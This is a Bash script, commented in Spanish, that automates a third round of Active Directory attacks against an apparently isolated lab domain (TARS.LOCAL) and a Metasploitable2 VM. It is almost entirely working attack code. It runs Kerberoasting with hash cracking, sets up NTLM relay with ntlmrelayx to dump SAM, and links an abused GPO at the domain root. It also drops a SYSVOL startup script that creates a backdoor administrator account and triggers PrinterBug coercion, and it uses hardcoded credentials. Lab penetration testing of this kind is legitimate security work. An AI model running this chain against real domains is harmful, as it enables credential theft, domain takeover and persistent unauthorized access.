#!/usr/bin/env bash
# =============================================================================
# SUITE AD REAL — ROUND 3 (fixes finales) — TARS.LOCAL 2026-08-09
# R1 kerberoast (script parcheado: bloque [realms] multilinea)
# R2 metasploitable2 (chcon SELinux -> start -> relay win Administrator->SAM)
# R3 firewall 445 host para listener ntlmrelayx
# R4 relay -> DC SMB (signing block, trigger real)
# R5 GPO: setlink a raiz de dominio + payload SYSVOL via SMB + verify
# R6 printerbug via apt Kali (repo GitHub eliminado)
# R7 cleanup (firewall off, metasploitable2 off)
# =============================================================================
set -u
DC=192.168.122.50
REALM=TARS.LOCAL
ADMIN='Administrator'
ADMPW='TarsLab2026!'
VENV=/opt/ad-tools-venv/bin
SKILLDIR=/opt/ad-lab/suite-ad-real
OUT=/opt/ad-lab/evidence/suite-ad-real-20260809
HOST_IP=192.168.122.1
GUID='{40B48ABF-204C-4FF6-8576-F75F531FFF77}'   # TARS-GPO-Abuse (round 2)
TS(){ date +%H:%M:%S; }
SSH_DC="sshpass -p TarsLab2026! ssh -o StrictHostKeyChecking=accept-new -o ConnectTimeout=10 root@$DC"
echo "[$(TS)] ============ ROUND 3 START ============"

# ---------- R1 kerberoast (script ya parcheado local -> scp en deploy) ----------
echo "[$(TS)] === R1 kerberoast con conf multilinea ==="
chmod +x $SKILLDIR/*.sh $SKILLDIR/*.py
timeout 240 $SKILLDIR/samba-kerberoast.sh $DC $REALM "$ADMIN" "$ADMPW" \
  MSSQLSvc/dc01.tars.local:1433 CIFS/backup.tars.local HTTP/app.tars.local HTTP/web.tars.local \
  2>&1 | tee "$OUT/02-kerberoast-hashes.txt"; echo "rc=$?"
grep '^\$krb5tgs\$' "$OUT/02-kerberoast-hashes.txt" > "$OUT/02-kerb.hashes" 2>/dev/null || true
echo "[$(TS)] TGS hashes: $(wc -l < "$OUT/02-kerb.hashes")"
if [ -s "$OUT/02-kerb.hashes" ]; then
  timeout 300 $VENV/python3 $SKILLDIR/crack-krb5tgs-rc4.py "$OUT/02-kerb.hashes" /tmp/wordlist-lab.txt 2>&1 | tee "$OUT/04-kerb-crack.txt"
fi

# ---------- R2/R3 metasploitable2 + firewall ----------
echo "[$(TS)] === R2 metasploitable2: chcon + start ==="
META_DISK=/data/vms/metasploitable2/metasploitable2.qcow2
ls -lZ "$META_DISK" 2>&1
chcon -t svirt_image_t "$META_DISK" 2>&1 && echo "chcon OK"
virsh start metasploitable2 2>&1 | tee "$OUT/08a-virsh-start.txt"
if ! virsh list --all | grep -q "metasploitable2.*running"; then
  echo "[$(TS)] chcon no basto — fallback NVMe (patron dc1 validado)"
  cp "$META_DISK" /var/lib/libvirt/images/metasploitable2.qcow2 && echo "copy OK"
  virsh dumpxml metasploitable2 > /tmp/meta.xml
  sed -i "s#/data/vms/metasploitable2/metasploitable2.qcow2#/var/lib/libvirt/images/metasploitable2.qcow2#" /tmp/meta.xml
  virsh undefine metasploitable2 2>&1 | head -1
  virsh define /tmp/meta.xml 2>&1 | head -1
  virsh start metasploitable2 2>&1 | tee "$OUT/08a-virsh-start.txt"
fi
if virsh list --all | grep -q "metasploitable2.*running"; then
  for i in $(seq 1 12); do
    sleep 10
    META_MAC=$(virsh dumpxml metasploitable2 2>/dev/null | grep -oE 'mac address="[0-9a-f:]+"' | cut -d'"' -f2)
    META_IP=$(virsh net-dhcp-leases default 2>/dev/null | awk -v m="$META_MAC" 'toupper($2)==toupper(m){print $5}' | head -1)
    [ -n "${META_IP:-}" ] && break
  done
  echo "[$(TS)] metasploitable2 IP=${META_IP:-NONE}"
  if [ -n "${META_IP:-}" ]; then
    echo "$META_IP" > "$OUT/08a-meta-ip.txt"
    timeout 20 $VENV/nxc smb "$META_IP" -u '' -p '' --shares 2>&1 | tee "$OUT/08a-meta-anon-shares.txt"
    echo "[$(TS)] abriendo 445 en firewall host:"
    firewall-cmd --add-port=445/tcp 2>&1 | tee "$OUT/08b-firewall.txt"; systemctl is-active firewalld | tee -a "$OUT/08b-firewall.txt"
    echo "[$(TS)] === R4a RELAY WIN Administrator -> metasploitable2 ==="
    $VENV/ntlmrelayx.py -t "smb://$META_IP" -smb2support -l "$OUT/relay-loot-meta" >"$OUT/08-relayx-meta.log" 2>&1 &
    RELAYPID=$!
    sleep 6
    timeout 25 smbclient //$HOST_IP/relay -U "$ADMIN%$ADMPW" -c 'ls' 2>&1 | tee "$OUT/08c-trigger-smbclient.txt"
    sleep 12
    kill $RELAYPID 2>/dev/null; wait $RELAYPID 2>/dev/null
    grep -iE "authenticated|dumping|sam|share|nt_status|session|attempting|error|wrote|smb-" "$OUT/08-relayx-meta.log" | head -40 | tee "$OUT/08d-relay-meta-result.txt"
    echo "[$(TS)] loot:"; ls -la "$OUT/relay-loot-meta/" 2>/dev/null | head -8
  fi
else
  echo "[$(TS)] metasploitable2 INARRANCADO — documentar, relay win NO disponible" | tee "$OUT/08a-virsh-start.txt"
fi

# ---------- R4b relay -> DC SMB (signing) ----------
echo "[$(TS)] === R4b relay Administrator -> DC SMB (signing check) ==="
$VENV/ntlmrelayx.py -t "smb://$DC" -smb2support -l "$OUT/relay-loot-dcsmb" >"$OUT/08-relayx-dcsmb.log" 2>&1 &
RELAYPID=$!
sleep 6
timeout 25 smbclient //$HOST_IP/relay -U "$ADMIN%$ADMPW" -c 'ls' 2>&1 | tee "$OUT/08h-trigger-dcsmb.txt"
sleep 12
kill $RELAYPID 2>/dev/null; wait $RELAYPID 2>/dev/null
grep -iE "authenticated|dumping|sam|nt_status|session|attempting|error|signing|refus|accept" "$OUT/08-relayx-dcsmb.log" | head -25 | tee "$OUT/08i-relay-dcsmb-result.txt"

# ---------- R5 GPO abuse (setlink raiz + payload SYSVOL) ----------
echo "[$(TS)] === R5 GPO abuse: setlink raiz dominio + payload ==="
$SSH_DC "samba-tool gpo setlink 'DC=tars,DC=local' '$GUID' -U 'Administrator%TarsLab2026!'" 2>&1 | grep -viE "debug_lookup|GENSEC|Starting GENSEC|temporary" | tee "$OUT/09c-gpo-setlink.txt"
$SSH_DC "mkdir -p '/var/lib/samba/sysvol/tars.local/Policies/$GUID/Machine/Scripts/Startup'; ls -R /var/lib/samba/sysvol/tars.local/Policies/$GUID/ 2>&1 | head -20" | tee "$OUT/09d-sysvol-tree.txt"
printf '@echo off\r\nnet user gpo_pwn Pwned2026! /add\r\nnet localgroup Administrators gpo_pwn /add\r\n' > /tmp/startup.cmd
printf '[Startup]\r\n0CmdLine=startup.cmd\r\n0Parameters=\r\n' > /tmp/scripts.ini
printf '[General]\r\nVersion=2\r\ngPCMachineExtensionNames=[{42B5FAAE-6536-11D2-AE5A-0000F87571E3}{40B6664F-4972-11D1-A7CA-0000F87571E3}]\r\n' > /tmp/gpt.ini
smbclient //$DC/sysvol -U "$ADMIN%$ADMPW" -c "cd tars.local/Policies/$GUID/Machine/Scripts/Startup; put /tmp/startup.cmd; put /tmp/scripts.ini; ls; cd ../../..; put /tmp/gpt.ini; ls; cd ../../../../; rmdir Startup" 2>&1 | tee "$OUT/09e-sysvol-write.txt"; echo "rc=$?"
$SSH_DC "echo '--- gpo show ---'; samba-tool gpo show '$GUID' 2>&1 | grep -viE 'debug_lookup|GENSEC|Starting|temporary'; echo '--- getlink raiz ---'; samba-tool gpo getlink 'DC=tars,DC=local' 2>&1 | grep -viE 'debug_lookup|GENSEC|Starting|temporary'; echo '--- payload en SYSVOL ---'; cat '/var/lib/samba/sysvol/tars.local/Policies/$GUID/Machine/Scripts/Startup/startup.cmd'; echo '--- gpt.ini ---'; cat '/var/lib/samba/sysvol/tars.local/Policies/$GUID/gpt.ini'" | tee "$OUT/09f-gpo-verify.txt"

# ---------- R6 printerbug via Kali apt ----------
echo "[$(TS)] === R6 printerbug (repo GitHub eliminado; apt Kali) ==="
ssh -o ConnectTimeout=10 -o BatchMode=yes root@192.168.122.151 "apt-cache policy printerbug 2>/dev/null | head -4; which printerbug.py 2>/dev/null" 2>&1 | tee "$OUT/08j-printerbug-kali.txt"
if ssh -o ConnectTimeout=10 -o BatchMode=yes root@192.168.122.151 "which printerbug.py >/dev/null 2>&1" 2>/dev/null; then
  ssh -o ConnectTimeout=10 -o BatchMode=yes root@192.168.122.151 "printerbug.py $HOST_IP $DC 2>&1 | tail -8" 2>&1 | tee -a "$OUT/08j-printerbug-kali.txt"
else
  echo "printerbug no instalado en Kali (repo eliminado, apt sin paquete)" >> "$OUT/08j-printerbug-kali.txt"
fi

# ---------- R7 cleanup ----------
echo "[$(TS)] === R7 cleanup ==="
firewall-cmd --remove-port=445/tcp 2>&1 | head -1
virsh shutdown metasploitable2 2>&1 | head -1
echo "[$(TS)] ============ ROUND 3 DONE ============"
